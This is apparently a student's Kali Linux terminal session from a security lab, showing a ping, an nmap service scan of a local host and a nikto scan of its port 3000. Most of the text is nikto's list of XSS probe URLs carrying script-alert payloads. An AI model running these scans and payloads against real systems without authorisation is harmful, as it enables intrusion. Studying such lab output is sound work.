┌──(kali㉿kali)-[~/Desktop]
└─$ cd SW_LAB3 
                                                                                              
┌──(kali㉿kali)-[~/Desktop/SW_LAB3]
└─$ ping -c 4 192.168.100.168
PING 192.168.100.168 (192.168.100.168) 56(84) bytes of data.
64 bytes from 192.168.100.168: icmp_seq=1 ttl=128 time=0.465 ms
64 bytes from 192.168.100.168: icmp_seq=2 ttl=128 time=0.267 ms
64 bytes from 192.168.100.168: icmp_seq=3 ttl=128 time=1.15 ms
64 bytes from 192.168.100.168: icmp_seq=4 ttl=128 time=0.441 ms

--- 192.168.100.168 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3048ms
rtt min/avg/max/mdev = 0.267/0.580/1.150/0.337 ms
                                                                                              
┌──(kali㉿kali)-[~/Desktop/SW_LAB3]
└─$ nmap -sV -p- -T4 192.168.100.168 -oN reporte_nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 19:54 EST
Nmap scan report for 192.168.100.168
Host is up (0.00071s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE         VERSION
80/tcp    open  http            Apache httpd 2.4.66 ((Debian))
902/tcp   open  ssl/vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)
1716/tcp  open  tcpwrapped
3000/tcp  open  http            Node.js Express framework
3306/tcp  open  mysql           MySQL 8.0.45
8080/tcp  open  http            Apache Tomcat (language: en)
8081/tcp  open  http            Apache httpd 2.4.65 ((Debian))
33060/tcp open  mysqlx          MySQL X protocol listener
41215/tcp open  unknown
60567/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port41215-TCP:V=7.95%I=7%D=2/4%Time=6983EA55%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,D84,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nD
SF:ate:\x20Thu,\x2005\x20Feb\x202026\x2000:54:45\x20GMT\r\nConnection:\x20
SF:close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\n<head>\n\t<link\x20rel=\"sty
SF:lesheet\"\x20href=\"browser\.css\">\n\t<link\x20rel=\"icon\"\x20type=\"
SF:image/svg\+xml\"\x20href=\"antigravity\.svg\">\n\t<title>Browser</title
SF:>\n</head>\n\n<body>\n\t<div\x20class=\"animated-background\">\n\t\t<di
SF:v\x20class=\"gradient-orb\x20orb-1\"></div>\n\t\t<div\x20class=\"gradie
SF:nt-orb\x20orb-2\"></div>\n\t\t<div\x20class=\"gradient-orb\x20orb-3\"><
SF:/div>\n\t</div>\n\n\t<div\x20class=\"landing-container\">\n\t\t<div\x20
SF:class=\"onboarding-card\">\n\t\t\t<div\x20class=\"icon-container\">\n\t
SF:\t\t\t<img\x20src=\"antigravity\.svg\"\x20alt=\"Antigravity\"\x20class=
SF:\"browser-icon\">\n\t\t\t</div>\n\t\t\t<h3\x20class=\"welcome-text\">We
SF:lcome\x20to</h3>\n\t\t\t<div\x20class=\"title-container\">\n\t\t\t\t<h1
SF:\x20class=\"main-title\">Antigravity\x20Browser\x20Control</h1>\n\t\t\t
SF:\t<p\x20class=\"preview-pill\">Preview</p>\n\t\t\t</div>\n\t\t\t<hr\x20
SF:class=\"title-divider\">\n\n\t\t\t<h2\x20class=\"hero-title\">Getting\x
SF:20Started</h2>\n\n\t\t\t<p\x20class")%r(HTTPOptions,D84,"HTTP/1\.1\x202
SF:00\x20OK\r\nContent-Type:\x20text/html\r\nDate:\x20Thu,\x2005\x20Feb\x2
SF:02026\x2000:54:45\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n<html>\n\n<head>\n\t<link\x20rel=\"stylesheet\"\x20href=\"browser\
SF:.css\">\n\t<link\x20rel=\"icon\"\x20type=\"image/svg\+xml\"\x20href=\"a
SF:ntigravity\.svg\">\n\t<title>Browser</title>\n</head>\n\n<body>\n\t<div
SF:\x20class=\"animated-background\">\n\t\t<div\x20class=\"gradient-orb\x2
SF:0orb-1\"></div>\n\t\t<div\x20class=\"gradient-orb\x20orb-2\"></div>\n\t
SF:\t<div\x20class=\"gradient-orb\x20orb-3\"></div>\n\t</div>\n\n\t<div\x2
SF:0class=\"landing-container\">\n\t\t<div\x20class=\"onboarding-card\">\n
SF:\t\t\t<div\x20class=\"icon-container\">\n\t\t\t\t<img\x20src=\"antigrav
SF:ity\.svg\"\x20alt=\"Antigravity\"\x20class=\"browser-icon\">\n\t\t\t</d
SF:iv>\n\t\t\t<h3\x20class=\"welcome-text\">Welcome\x20to</h3>\n\t\t\t<div
SF:\x20class=\"title-container\">\n\t\t\t\t<h1\x20class=\"main-title\">Ant
SF:igravity\x20Browser\x20Control</h1>\n\t\t\t\t<p\x20class=\"preview-pill
SF:\">Preview</p>\n\t\t\t</div>\n\t\t\t<hr\x20class=\"title-divider\">\n\n
SF:\t\t\t<h2\x20class=\"hero-title\">Getting\x20Started</h2>\n\n\t\t\t<p\x
SF:20class");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.82 seconds
                                                                                              
┌──(kali㉿kali)-[~/Desktop/SW_LAB3]
└─$ nikto -h http://192.168.100.168:3000
nikto -h http://192.168.100.168:8080
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.100.168
+ Target Hostname:    192.168.100.168
+ Target Port:        3000
+ Start Time:         2026-02-04 19:55:52 (GMT-5)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: Retrieved x-powered-by header: Express.
+ /: Retrieved access-control-allow-origin header: *.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1204
+ /index.php?option=search&searchword=<script>alert(document.cookie);</script>: Mambo Site Server 4.0 build 10 is vulnerable to Cross Site Scripting (XSS).
+ /emailfriend/emailnews.php?id=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1204
+ /emailfriend/emailfaq.php?id=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1204
+ /emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1204
+ /administrator/upload.php?newbanner=1&choice=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS).
+ /administrator/popups/sectionswindow.php?type=web&link=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1204
+ /administrator/gallery/view.php?path=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1204
+ /administrator/gallery/uploadimage.php?directory=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1204
+ /administrator/gallery/navigation.php?directory=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1204
+ /administrator/gallery/gallery.php?directory=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1204
+ /index.php?dir=<script>alert('Vulnerable')</script>: Auto Directory Index 1.2.3 and prior are vulnerable to XSS attacks. See: https://vulners.com/osvdb/OSVDB:2820
+ /https-admserv/bin/index?/<script>alert(document.cookie)</script>: Sun ONE Web Server 6.1 administration control is vulnerable to XSS attacks.
+ /clusterframe.jsp?cluster=<script>alert(document.cookie)</script>: Macromedia JRun 4.x JMC Interface, clusterframe.jsp file is vulnerable to a XSS attack. See: OSVDB-2876
+ /upload.php?type=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS).
+ /soinfo.php?\"><script>alert('Vulnerable')</script>: The PHP script soinfo.php is vulnerable to Cross Site Scripting. Set expose_php = Off in php.ini. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1954
+ /666%0a%0a<script>alert('Vulnerable');</script>666.jsp: Apache Tomcat 4.1 / Linux is vulnerable to Cross Site Scripting (XSS).
+ /servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>: NetDetector 3.0 and below are vulnerable to Cross Site Scripting (XSS).
+ /servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes.
+ /servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes.
+ /servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes.
+ /servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes.
+ /servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>: The NetDetector install is vulnerable to Cross Site Scripting (XSS) in its invalid login message.
+ /admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\"><script>alert(document.cookie)</script>: IIS 6 on Windows 2003 is vulnerable to Cross Site Scripting (XSS) in certain error messages.
+ /SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>: Site Server is vulnerable to Cross Site Scripting. See: OSVDB-17665
+ /_mem_bin/formslogin.asp?\"><script>alert('Vulnerable')</script>: Site Server is vulnerable to Cross Site Scripting. See: OSVDB-17666
+ /nosuchurl/><script>alert('Vulnerable')</script>: JEUS is vulnerable to Cross Site Scripting (XSS) when requesting non-existing JSP pages. See: https://seclists.org/fulldisclosure/2003/Jun/494
+ /webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>: Webcalendar 0.9.42 and below are vulnerable to Cross Site Scripting (XSS). See: OSVDB-3624
+ /~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null: Cross site scripting (XSS) is allowed with .aspx file requests. See: http://www.cert.org/advisories/CA-2000-02.html
+ /~/<script>alert('Vulnerable')</script>.aspx: Cross site scripting (XSS) is allowed with .aspx file requests. See: http://www.cert.org/advisories/CA-2000-02.html
+ /~/<script>alert('Vulnerable')</script>.asp: Cross site scripting (XSS) is allowed with .asp file requests. See: http://www.cert.org/advisories/CA-2000-02.html
+ /user.php?op=userinfo&uname=<script>alert('hi');</script>: The PHP-Nuke installation is vulnerable to Cross Site Scripting (XSS). Update to versions above 5.3.1.
+ /templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>: MyMarket 1.71 is vulnerable to Cross Site Scripting (XSS). See: OSVDB-41361
+ /supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;: MyHelpdesk versions v20020509 and older are vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0931
+ /supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;: MyHelpdesk versions v20020509 and older are vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0931
+ /supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;: MyHelpdesk versions v20020509 and older are vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0931
+ /sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>: SunShop is vulnerable to Cross Site Scripting (XSS) in the signup page.
+ /submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview: This install of PHP-Nuke is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1524
+ /ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1732
+ /setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P: CiscoSecure ACS v3.0(1) Build 40 allows Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0938
+ /servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>: Open Market Inc. ContentServer is vulnerable to Cross Site Scripting (XSS) in the login-error page. See: OSVDB-2689
+ /search.php?searchstring=<script>alert(document.cookie)</script>: Gallery 1.3.4 and below is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.securityfocus.com/bid/8288. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0614
+ /search.php?searchfor=\"><script>alert(1776)</script>: Siteframe 2.2.4 is vulnerable to Cross Site Scripting (XSS). See: OSVDB-50551
+ /search.asp?term=<%00script>alert('Vulnerable')</script>: ASP.Net 1.1 may allow Cross Site Scripting (XSS) in error pages (only some browsers will render this).
+ /samples/search.dll?query=<script>alert(document.cookie)</script>&logic=AND: Sambar Server default script is vulnerable to Cross Site Scripting (XSS).
+ /replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>: This version of PHP-Nuke's replymsg.php is vulnerable to Cross Site Scripting (XSS).
+ /postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft+Utilities\"%3<script>alert('Vulnerable')</script>: Postnuke Phoenix 0.7.2.3 is vulnerable to Cross Site Scripting (XSS).
+ /pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). See: OSVDB-4599
+ /phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\"><script>alert('Vulnerable')</script>: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS).
+ /phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS).
+ /phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\"><script>alert('Vulnerable')</script>: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS).
+ /phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\"><script>alert('Vulnerable')</script>: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS).
+ /phptonuke.php?filnavn=<script>alert('Vulnerable')</script>: PHP-Nuke add-on PHPToNuke is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1995
+ /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Contains PHP configuration information and is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1287
+ /phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>: Contains PHP configuration information and is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1287
+ /phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>: phpBB is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0484
+ /phpBB/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>: phpBB is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0484
+ /phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>: Phorum 3.3.2a and below from phorum.org is vulnerable to Cross Site Scripting (XSS). See: OSVDB-11145
+ /phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>: Phorum 3.3.2a and below from phorum.org is vulnerable to Cross Site Scripting (XSS). See: OSVDB-11144
+ /Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>: Vignette server is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version.
+ /node/view/666\"><script>alert(document.domain)</script>: Drupal 4.2.0 RC is vulnerable to Cross Site Scripting (XSS).
+ /netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: OSVDB-5106
+ /nav/cList.php?root=</script><script>alert('Vulnerable')/<script>: RaQ3 server script is vulnerable to Cross Site Scripting (XSS).
+ /myhome.php?action=messages&box=<script>alert('Vulnerable')</script>: OpenBB 1.0.0 RC3 is vulnerable to Cross Site Scripting (XSS).
+ /msadm/user/login.php3?account_name=\"><script>alert('Vulnerable')</script>: The Sendmail Server Site User login is vulnerable to Cross Site Scripting (XSS).
+ /msadm/site/index.php3?authid=\"><script>alert('Vulnerable')</script>: The Sendmail Server Site Administrator Login is vulnerable to Cross Site Scripting (XSS).
+ /msadm/domain/index.php3?account_name=\"><script>alert('Vulnerable')</script>: The Sendmail Server Site Domain Administrator login is vulnerable to Cross Site Scripting (XSS).
+ /modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>: Basit cms 1.0 is vulnerable to Cross Site Scripting (XSS). See: OSVDB-50539
+ /modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS).
+ /modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS).
+ /modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS).
+ /modules/Forums/bb_smilies.php?bgcolor1=\"><script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>: The XForum (PHP-Nuke Add-on module) is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2: The XForum (PHP-Nuke Add-on module) is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>: Wiki PostNuke Module is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1070
+ /modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>: This install of PHP-Nuke's modules.php is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>: The DMOZGateway (PHP-Nuke Add-on module) is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1523
+ /modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>: Francisco Burzi PHP-Nuke 5.6, 6.0, 6.5 RC1/RC2/RC3, 6.5 is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS).
+ /modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2020
+ /modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2020
+ /modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>: This install of PHP-Nuke is vulnerable to Cross Site Scripting (XSS). See: OSVDB-5914
+ /modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS).
+ /megabook/admin.cgi?login=<script>alert('Vulnerable')</script>: Megabook guestbook is vulnerable to Cross Site Scripting (XSS). See: OSVDB-3201
+ /mailman/listinfo/<script>alert('Vulnerable')</script>: Mailman is vulnerable to Cross Site Scripting (XSS). Upgrade to version 2.0.8 to fix.
+ /launch.jsp?NFuse_Application=<script>alert('Vulnerable')</script>: NFuse is vulnerable to cross site scripting (XSS) in the GetLastError function. Upgrade to the latest version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0504
+ /launch.asp?NFuse_Application=<script>alert('Vulnerable')</script>: NFuse is vulnerable to cross site scripting (XSS) in the GetLastError function. Upgrade to the latest version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0504
+ /isapi/testisa.dll?check1=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: OSVDB-5803
+ /index.php?file=Liens&op=\"><script>alert('Vulnerable');</script>: Nuked-klan 1.3b is vulnerable to Cross Site Scripting (XSS). See: OSVDB-50552
+ /index.php?action=storenew&username=<script>alert('Vulnerable')</script>: SunShop is vulnerable to Cross Site Scripting (XSS) in the signup page.
+ /index.php?action=search&searchFor=\"><script>alert('Vulnerable')</script>: MiniBB is vulnerable to Cross Site Scripting (XSS). See: http://www.minibb.net
+ /index.php/\"><script><script>alert(document.cookie)</script><: eZ publish v3 and prior allow Cross Site Scripting (XSS).
+ /index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>: eZ publish v3 and prior allow Cross Site Scripting (XSS).
+ /index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search: eZ publish v3 and prior allow Cross Site Scripting (XSS).
+ /html/partner.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>: myphpnuke version 1.8.8_final_7 is vulnerable to Cross Site Scripting (XSS).
+ /html/chatheader.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>: myphpnuke version 1.8.8_final_7 is vulnerable to Cross Site Scripting (XSS).
+ /html/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>: This CGI is vulnerable to Cross Site Scripting (XSS).
+ /gallery/search.php?searchstring=<script>alert(document.cookie)</script>: Gallery 1.3.4 and below is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.securityfocus.com/bid/8288. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0614
+ /friend.php?op=SiteSent&fname=<script>alert('Vulnerable')</script>: This version of PHP-Nuke's friend.php is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1524
+ /forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>: YaBB is vulnerable to Cross Site Scripting (XSS) in the password field of the login page. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6133,http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1845
+ /error/500error.jsp?et=1<script>alert('Vulnerable')</script>;: Macromedia Sitespring 1.2.0(277.1) on Windows 2000 is vulnerable to Cross Site Scripting (XSS) in the error pages. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1027
+ /download.php?sortby=&dcategory=<script>alert('Vulnerable')</script>: This version of PHP-Nuke's download.php is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version.
+ /comments.php?subject=<script>alert('Vulnerable')</script>&comment=<script>alert('Vulnerable')</script>&pid=0&sid=0&mode=&order=&thold=op=Preview: This version of PHP-Nuke's comments.php is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version.
+ /cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)</script>: RSA ClearTrust allows Cross Site Scripting (XSS). See: OSVDB-50619
+ /cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>: This CGI is vulnerable to Cross Site Scripting (XSS). See: https://vulners.com/osvdb/OSVDB:651
+ /cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>: This CGI is vulnerable to Cross Site Scripting (XSS). See: https://vulners.com/osvdb/OSVDB:651
+ /calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05: DCP-Portal v5.3.1 is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1536
+ /ca000007.pl?ACTION=SHOWCART&REFPAGE=\"><script>alert('Vulnerable')</script>: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1732
+ /ca000001.pl?ACTION=SHOWCART&hop=\"><script>alert('Vulnerable')</script>&PATH=acatalog%2f: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1732
+ /bb000001.pl<script>alert('Vulnerable')</script>: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1732
+ /article.cfm?id=1'<script>alert(document.cookie);</script>: With malformed URLs, ColdFusion is vulnerable to Cross Site Scripting (XSS).
+ /apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script>: Zeus 4.2r2 (webadmin-4.2r2) is vulnerable to Cross Site Scripting (XSS). See: https://www.mail-archive.com/bugtraq@securityfocus.com/msg11627.html
+ /addressbook/index.php?surname=<script>alert('Vulnerable')</script>: Phpgroupware 0.9.14.003 is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0504
+ /addressbook/index.php?name=<script>alert('Vulnerable')</script>: Phpgroupware 0.9.14.003 is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0504
+ /add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>: Admanager 1.1 is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/vuln-dev/2002/Apr/270
+ /a?<script>alert('Vulnerable')</script>: Server is vulnerable to Cross Site Scripting (XSS) in the error message if code is passed in the query-string. This may be a Null HTTPd server.
+ /a.jsp/<script>alert('Vulnerable')</script>: JServ is vulnerable to Cross Site Scripting (XSS) when a non-existent JSP file is requested. Upgrade to the latest version of JServ.
+ /?mod=<script>alert(document.cookie)</script>&op=browse: Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1243
+ /<script>alert('Vulnerable')</script>.thtml: Server is vulnerable to Cross Site Scripting (XSS).
+ /<script>alert('Vulnerable')</script>.shtml: Server is vulnerable to Cross Site Scripting (XSS).
+ /<script>alert('Vulnerable')</script>.jsp: Server is vulnerable to Cross Site Scripting (XSS).
+ /<script>alert('Vulnerable')</script>.aspx: Cross site scripting (XSS) is allowed with .aspx file requests (may be Microsoft .net).
+ /<script>alert('Vulnerable')</script>: Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0681
+ /mailman/admin/ml-name?\"><script>alert('Vulnerable')</script>;: Mailman is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0855
